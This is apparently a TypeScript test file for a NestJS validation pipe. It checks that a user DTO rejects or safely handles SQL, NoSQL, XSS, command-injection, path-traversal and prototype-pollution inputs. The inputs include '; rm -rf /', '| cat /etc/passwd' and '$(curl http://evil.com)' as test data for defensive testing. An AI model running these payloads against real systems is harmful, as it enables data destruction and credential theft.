
import { ValidationPipe } from '../pipes/validation.pipe.js';
import { BadRequestException } from '@nestjs/common';
import { validate , IsEmail, IsString, IsOptional, IsNumber, MinLength } from 'class-validator';
import { plainToClass } from 'class-transformer';
import { describe, it, expect, beforeEach } from 'vitest';

// Test DTOs for validation
class TestUserDto {
	@IsEmail()
	public email!: string;

	@IsString()
	@MinLength(8)
	public password!: string;

	@IsOptional()
	@IsNumber()
	public age?: number;

	@IsString()
	@MinLength(1)
	public name!: string;
}

describe('Input Validation Security Tests', () => {
	let validationPipe: ValidationPipe;

	beforeEach(() => {
		validationPipe = new ValidationPipe();
	});

	describe('SQL Injection Prevention', () => {
		it('should prevent SQL injection in email field', async () => {
			const sqlInjectionPayloads = [
				{ email: '\' OR \'1\'=\'1', password: 'password123', name: 'Test' },
				{ email: 'admin\' --', password: 'password123', name: 'Test' },
				{ email: '\'; DROP TABLE users; --', password: 'password123', name: 'Test' },
				{ email: '\' UNION SELECT * FROM users --', password: 'password123', name: 'Test' },
				{ email: 'test@example.com\' OR \'1\'=\'1', password: 'password123', name: 'Test' },
			];

			for (const payload of sqlInjectionPayloads) {
				const testObject = plainToClass(TestUserDto, payload);
				const errors = await validate(testObject);

				// Should have validation errors due to invalid email format
				expect(errors.length).toBeGreaterThan(0);
				expect(errors.some(error => error.property === 'email')).toBe(true);
			}
		});

		it('should prevent SQL injection in password field', () => {
			const sqlInjectionPasswords = [
				'\' OR \'1\'=\'1',
				'\'; DROP TABLE users; --',
				'\' UNION SELECT password FROM users --',
				'admin\' --',
				'password\' OR \'1\'=\'1',
			];

			for (const password of sqlInjectionPasswords) {
				const payload = { email: 'test@example.com', password, name: 'Test' };
				const testObject = plainToClass(TestUserDto, payload);

				// Password validation should still work (if any constraints exist)
				// The main point is that SQL injection strings should not cause crashes
				expect(() => validate(testObject)).not.toThrow();
			}
		});

		it('should prevent SQL injection in name field', async () => {
			const sqlInjectionNames = [
				'\'; DROP TABLE users; --',
				'\' UNION SELECT * FROM users --',
				'admin\' --',
				'Test\' OR \'1\'=\'1',
			];

			for (const name of sqlInjectionNames) {
				const payload = { email: 'test@example.com', password: 'password123', name };
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				// Should not crash and should validate properly
				expect(() => validate(testObject)).not.toThrow();
			}
		});
	});

	describe('NoSQL Injection Prevention', () => {
		it('should prevent NoSQL injection in email field', async () => {
			const nosqlInjectionPayloads = [
				{ email: { $ne: null }, password: 'password123', name: 'Test' },
				{ email: { $regex: '.*' }, password: 'password123', name: 'Test' },
				{ email: { $where: 'this.email === "admin@example.com"' }, password: 'password123', name: 'Test' },
				{ email: { $gt: '' }, password: 'password123', name: 'Test' },
			];

			for (const payload of nosqlInjectionPayloads) {
				// These should fail class transformation or validation
				expect(() => plainToClass(TestUserDto, payload)).not.toThrow();
				const testObject = plainToClass(TestUserDto, payload);
				const errors = await validate(testObject);
				// Should have validation errors
				expect(errors.length).toBeGreaterThan(0);
			}
		});

		it('should prevent NoSQL injection via nested objects', async () => {
			const maliciousPayload = {
				email: 'test@example.com',
				password: 'password123',
				name: 'Test',
				$where: 'this.admin === true',
				$or: [{ role: 'admin' }],
			};

			const testObject = plainToClass(TestUserDto, maliciousPayload);
			const errors = await validate(testObject);

			// Should validate without issues (extra fields ignored)
			expect(errors.length).toBe(0);
		});
	});

	describe('XSS Prevention', () => {
		it('should prevent XSS in email field', async () => {
			const xssPayloads = [
				{ email: '<script>alert("xss")</script>@example.com', password: 'password123', name: 'Test' },
				{ email: 'test@example.com"><script>alert("xss")</script>', password: 'password123', name: 'Test' },
				{ email: '" onclick="alert(\'xss\')" @example.com', password: 'password123', name: 'Test' },
				{ email: '<img src=x onerror=alert("xss")>@example.com', password: 'password123', name: 'Test' },
			];

			for (const payload of xssPayloads) {
				const testObject = plainToClass(TestUserDto, payload);
				const errors = await validate(testObject);

				// Should have email validation errors due to invalid format
				expect(errors.length).toBeGreaterThan(0);
				expect(errors.some(error => error.property === 'email')).toBe(true);
			}
		});

		it('should prevent XSS in name field', async () => {
			const xssNames = [
				'<script>alert("xss")</script>',
				'<img src=x onerror=alert("xss")>',
				'"><script>alert("xss")</script>',
				'<iframe src="javascript:alert(\'xss\')"></iframe>',
				'<svg onload=alert("xss")>',
			];

			for (const name of xssNames) {
				const payload = { email: 'test@example.com', password: 'password123', name };
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				// Should validate without crashing
				expect(() => validate(testObject)).not.toThrow();
			}
		});

		it('should handle HTML entities and encoded XSS', async () => {
			const encodedXss = [
				'%3Cscript%3Ealert(%22xss%22)%3C/script%3E',
				'&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;',
				'&#60;script&#62;alert(&#34;xss&#34;)&#60;/script&#62;',
			];

			for (const name of encodedXss) {
				const payload = { email: 'test@example.com', password: 'password123', name };
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				expect(() => validate(testObject)).not.toThrow();
			}
		});
	});

	describe('Command Injection Prevention', () => {
		it('should prevent command injection in input fields', async () => {
			const commandInjectionPayloads = [
				{ email: 'test@example.com', password: '; rm -rf /', name: 'Test' },
				{ email: 'test@example.com', password: '| cat /etc/passwd', name: 'Test' },
				{ email: 'test@example.com', password: '`whoami`', name: 'Test' },
				{ email: 'test@example.com', password: '$(curl http://evil.com)', name: 'Test' },
				{ email: 'test@example.com; ls', password: 'password123', name: 'Test' },
			];

			for (const payload of commandInjectionPayloads) {
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				// Should validate without crashing
				expect(() => validate(testObject)).not.toThrow();
			}
		});

		it('should handle shell metacharacters', async () => {
			const shellMetacharacters = [
				';', '|', '&', '$', '`', '(', ')', '<', '>', '"', '\'', '\\',
				'&&', '||', ';;', '|&', '&>', '>&', '>>', '<<', '<>', '<<<',
			];

			for (const char of shellMetacharacters) {
				const payload = { email: 'test@example.com', password: `password${char}123`, name: 'Test' };
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				expect(() => validate(testObject)).not.toThrow();
			}
		});
	});

	describe('Input Sanitization and Length Limits', () => {
		it('should handle extremely long inputs', async () => {
			const longEmail = 'a'.repeat(1000) + '@example.com';
			const longPassword = 'a'.repeat(10000);
			const longName = 'a'.repeat(1000);

			const payload = { email: longEmail, password: longPassword, name: longName };
			const testObject = plainToClass(TestUserDto, payload);
			const _errors = await validate(testObject);

			// Should validate without crashing (even if validation fails due to length)
			expect(() => validate(testObject)).not.toThrow();
		});

		it('should handle null bytes and control characters', async () => {
			const nullByteInputs = [
				'test\x00@example.com',
				'test@example.com\x00',
				'password\x00123',
				'name\x00test',
			];

			for (const input of nullByteInputs) {
				const payload = { email: 'test@example.com', password: input, name: 'Test' };
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				expect(() => validate(testObject)).not.toThrow();
			}
		});

		it('should handle unicode and special characters', async () => {
			const unicodeInputs = [
				'测试@example.com', // Chinese
				'tëst@example.com', // Unicode characters
				'test@例え.com', // Mixed unicode
				'passwordñ', // Unicode in password
				'na̶me', // Unicode combining
			];

			for (const input of unicodeInputs) {
				const payload = { email: 'test@example.com', password: input, name: 'Test' };
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				expect(() => validate(testObject)).not.toThrow();
			}
		});
	});

	describe('Type Confusion and Prototype Pollution', () => {
		it('should prevent prototype pollution attempts', async () => {
			const prototypePollutionPayloads = [
				{ email: 'test@example.com', password: 'password123', name: 'Test', __proto__: { isAdmin: true } } as any,
				{ email: 'test@example.com', password: 'password123', name: 'Test', constructor: { prototype: { isAdmin: true } } } as any,
				{ email: 'test@example.com', password: 'password123', name: 'Test', prototype: { isAdmin: true } } as any,
			];

			for (const payload of prototypePollutionPayloads) {
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				// Should not pollute prototype
				expect(({} as any).isAdmin).toBeUndefined();
				expect((Object.prototype as any).isAdmin).toBeUndefined();
			}
		});

		it('should handle type confusion attempts', async () => {
			const typeConfusionPayloads = [
				{ email: [], password: 'password123', name: 'Test' },
				{ email: {}, password: 'password123', name: 'Test' },
				{ email: 123, password: 'password123', name: 'Test' },
				{ email: true, password: 'password123', name: 'Test' },
				{ email: null, password: 'password123', name: 'Test' },
			];

			for (const payload of typeConfusionPayloads) {
				const testObject = plainToClass(TestUserDto, payload);
				const errors = await validate(testObject);

				// Should have validation errors due to type mismatch
				expect(errors.length).toBeGreaterThan(0);
			}
		});
	});

	describe('Path Traversal Prevention', () => {
		it('should prevent path traversal in input fields', async () => {
			const pathTraversalPayloads = [
				{ email: '../../../etc/passwd@example.com', password: 'password123', name: 'Test' },
				{ email: '..\\..\\..\\windows\\system32\\config', password: 'password123', name: 'Test' },
				{ email: 'test@example.com', password: '../../../etc/shadow', name: 'Test' },
				{ email: 'test@example.com', password: 'password123', name: '../../../root/.ssh/id_rsa' },
			];

			for (const payload of pathTraversalPayloads) {
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				// Should validate without crashing
				expect(() => validate(testObject)).not.toThrow();
			}
		});

		it('should handle encoded path traversal', async () => {
			const encodedPaths = [
				'%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
				'%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32',
				'..%2f..%2f..%2fetc%2fpasswd',
			];

			for (const path of encodedPaths) {
				const payload = { email: 'test@example.com', password: path, name: 'Test' };
				const testObject = plainToClass(TestUserDto, payload);
				const _errors = await validate(testObject);

				expect(() => validate(testObject)).not.toThrow();
			}
		});
	});

	describe('Validation Pipe Integration', () => {
		it('should reject requests with validation errors', async () => {
			const invalidPayload = { email: 'invalid-email', password: '', name: '' };

			await expect(validationPipe.transform(invalidPayload, {
				type: 'body',
				metatype: TestUserDto,
			})).rejects.toThrow(BadRequestException);
		});

		it('should accept valid requests', async () => {
			const validPayload = { email: 'test@example.com', password: 'password123', name: 'Test User' };

			const result = await validationPipe.transform(validPayload, {
				type: 'body',
				metatype: TestUserDto,
			});

			expect(result).toBeDefined();
			expect(result.email).toBe('test@example.com');
			expect(result.password).toBe('password123');
			expect(result.name).toBe('Test User');
		});

		it('should skip validation for primitive types', async () => {
			const primitiveValue = 'test-string';

			const result = await validationPipe.transform(primitiveValue, {
				type: 'body',
				metatype: String,
			});

			expect(result).toBe(primitiveValue);
		});
	});

	describe('Error Message Security', () => {
		it('should not leak sensitive information in error messages', async () => {
			const invalidPayload = { email: 'invalid-email', password: 'short', name: '' };

			try {
				await validationPipe.transform(invalidPayload, {
					type: 'body',
					metatype: TestUserDto,
				});
				expect.fail('Should have thrown BadRequestException');
			} catch (error: any) {
				expect(error).toBeInstanceOf(BadRequestException);
				const errorMessage = error.message;

				// Error messages should not contain sensitive information
				expect(errorMessage).not.toContain('password');
				expect(errorMessage).not.toContain('secret');
				expect(errorMessage).not.toContain('token');
				expect(errorMessage).not.toContain('key');
			}
		});

		it('should provide generic error messages', async () => {
			const invalidPayload = { email: '<script>alert("xss")</script>', password: 'password123', name: 'Test' };

			try {
				await validationPipe.transform(invalidPayload, {
					type: 'body',
					metatype: TestUserDto,
				});
				expect.fail('Should have thrown BadRequestException');
			} catch (error: any) {
				expect(error).toBeInstanceOf(BadRequestException);
				// Should have validation errors for the email field
				const response = error.getResponse?.() as any; const messageText = JSON.stringify(response).toLowerCase(); expect(messageText).toContain('email');
			}
		});
	});
});
